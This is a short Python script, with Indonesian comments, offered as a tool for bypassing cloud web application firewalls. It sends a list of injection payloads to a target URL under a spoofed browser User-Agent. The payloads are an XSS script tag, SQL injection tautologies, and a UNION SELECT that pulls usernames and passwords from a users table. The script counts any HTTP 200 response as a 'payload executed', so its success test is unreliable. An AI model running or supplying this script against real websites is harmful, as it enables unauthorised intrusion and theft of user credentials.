import requests
import random

# Daftar payload untuk bypass WAF berbasis cloud
CLOUD_BYPASS_PAYLOADS = [
    "<script>alert('Cloud WAF Bypass')</script>",
    "1' OR '1'='1' --",
    "UNION SELECT null, username, password FROM users --",
    "‘ OR 1=1 --"
]

# Fungsi untuk bypass WAF berbasis cloud
def cloud_waf_bypass(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    for payload in CLOUD_BYPASS_PAYLOADS:
        print(f"Trying payload: {payload}")
        try:
            response = requests.get(url, headers=headers, params={"input": payload})
            if response.status_code == 200:
                print(f"Payload executed: {payload}")
            else:
                print(f"Failed request: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Contoh penggunaan:
# cloud_waf_bypass("http://target.com/vulnerable.php")
